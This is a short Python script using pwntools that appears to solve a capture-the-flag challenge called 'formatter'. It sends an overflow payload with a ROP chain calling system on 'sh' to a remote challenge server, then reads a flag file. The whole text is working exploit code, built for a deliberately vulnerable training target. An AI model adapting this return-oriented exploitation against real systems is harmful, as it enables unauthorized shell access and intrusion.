from pwn import *

"""
Strategy:
    pop rdi; ret   at 0x00000000004015e3
    call system    at 0x0000000000401535
"""


buffer_addr = 0x04050a0
win_addr = 0x0401255
c = remote("formatter.challs.olicyber.it", 20006)
#c = process("./formatter")

ow_size = 0x50
c.recvuntil(b'stringhe.\n')

chain = p64(0x00000000004015e3) + p64(buffer_addr) + p64(0x0000000000401535)
cmd = b'sh\0.'
filler = ((ow_size - len(cmd) - len(chain) - 8) // 4) + 8
payload = cmd + b'\\a'*filler + chain
c.sendline(payload)
c.sendline(b'cat flag2.txt')
f = c.recvline().decode().strip()
print(f)
